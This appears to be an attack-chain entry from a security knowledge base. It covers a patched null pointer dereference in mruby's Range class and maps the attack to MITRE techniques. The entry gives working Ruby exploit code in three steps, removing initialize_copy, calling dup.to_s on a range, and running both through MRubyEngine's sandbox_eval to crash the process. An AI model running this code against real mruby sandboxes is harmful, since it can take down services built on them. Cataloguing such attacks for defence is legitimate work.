---
tags:
  - mruby
  - ruby
  - null-pointer-dereference
  - dos
  - segfault
type: attack_chain
tools:
  - '[[tools/MRubyEngine]]'
tactics:
  - '[[Execution]]'
  - '[[Impact]]'
commands:
  - '[[commands/(1..2)-dup-to_s]]'
  - '[[commands/mrubyengine-sandbox-eval-exploit]]'
platforms:
  - Ruby
  - mruby
complexity: medium
procedures:
  - '[[procedures/Remove-Initialize-Copy-Method-from-Range-Class]]'
  - '[[procedures/Duplicate-Range-Object-and-Trigger-Segfault]]'
  - '[[procedures/Execute-Exploit-via-MRubyEngine-Sandbox]]'
step_count: 3
techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[Endpoint Denial of Service]]'
description: >-
  Exploitation of a null pointer dereference vulnerability in mruby's Range
  class by removing the initialize_copy method, duplicating a Range object, and
  triggering a segfault via MRubyEngine sandbox, resulting in process crash and
  denial of service.
skill_level: intermediate
impact_level: high
id: a208c7e6-db1a-4034-9321-5991a9e78168
created_at: '2025-12-11T03:47:48.486Z'
updated_at: '2025-12-11T03:47:48.486Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
  - '[[TA0040]]'
mitre_techniques:
  - '[[T1203]]'
  - '[[T1499]]'
---
# mruby Range Class Null Pointer Dereference via Method Removal Leading to Denial of Service

## Overview

This attack chain exploits a vulnerability in mruby's Range class by removing the initialize_copy method, which allows the creation of uninitialized Range objects. Duplicating such an object and calling a method on it leads to a null pointer dereference, causing a segfault and process crash. The exploit is triggered through the MRubyEngine sandbox in a Shopify-scripts environment, resulting in a denial of service. This was a high-severity issue with a $10,000 bounty, fixed by patching mruby to copy internal state before calling initialize_copy.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~1 minute |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Remove Method] --> B[Duplicate and Trigger] --> C[Sandbox Execution]
    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/MRubyEngine]]

### Target Environment

- Platform: Ruby/mruby
- Required services/ports: shopify-scripts, mruby-engine
- Network access requirements: Access to MRubyEngine sandbox environment

### Initial Access Requirements

- Credential requirements: None specified
- Network position: Local or integrated access to mruby runtime
- Prior access needed: Ability to execute Ruby code in the target environment

## Detailed Attack Procedures

### Step 1: Remove Initialize Copy Method - [[procedures/Remove-Initialize-Copy-Method-from-Range-Class]]

**Procedure**: [[procedures/Remove-Initialize-Copy-Method-from-Range-Class]]

**Objective**: Eliminate the initialize_copy method from the Range class to enable creation of uninitialized Range objects.

**Expected Output**: Method removed successfully, no immediate output.

**Success Indicators**:
- Range class modified without errors
- Subsequent duplication attempts do not call initialize_copy

First, remove the method using [[commands/remove-range-initialize-copy]]:

```ruby
Range.remove_method(:initialize_copy)
```

Verify the method is removed by checking Range.instance_methods.

### Step 2: Duplicate and Trigger Segfault - [[procedures/Duplicate-Range-Object-and-Trigger-Segfault]]

**Procedure**: [[procedures/Duplicate-Range-Object-and-Trigger-Segfault]]

**Objective**: Create and duplicate a Range object, then call a method to trigger the null pointer dereference and segfault.

**Expected Output**: Segfault occurs, crashing the process.

**Success Indicators**:
- Process crashes with segfault error
- Denial of service achieved

After method removal, duplicate the Range and trigger with [[commands/(1..2)-dup-to_s]]:

```ruby
(1..2).dup.to_s
```

Observe the crash due to uninitialized object.

### Step 3: Sandbox Execution - [[procedures/Execute-Exploit-via-MRubyEngine-Sandbox]]

**Procedure**: [[procedures/Execute-Exploit-via-MRubyEngine-Sandbox]]

**Objective**: Execute the malicious code snippet in the MRubyEngine sandbox to trigger the exploit in a controlled environment.

**Expected Output**: Segfault in mruby-engine process.

**Success Indicators**:
- Sandbox evaluation leads to process crash
- Denial of service in the target service

Instantiate and evaluate using [[commands/mrubyengine-sandbox-eval-exploit]]:

```ruby
MRubyEngine.new(512*1024, 1000, 1000).sandbox_eval("/tmp", %{Range.remove_method(:initialize_copy)
(1..2).dup.to_s})
```

Confirm the segfault in the mruby process.

## Attack Chain Summary

### Key Achievements

1. Successful removal of initialize_copy method
2. Triggering of null pointer dereference via object duplication
3. Denial of service through process crash in MRubyEngine

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploitation for Client Execution]]
- [[Endpoint Denial of Service]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Impact]]

*Last updated: 2023-10-01*
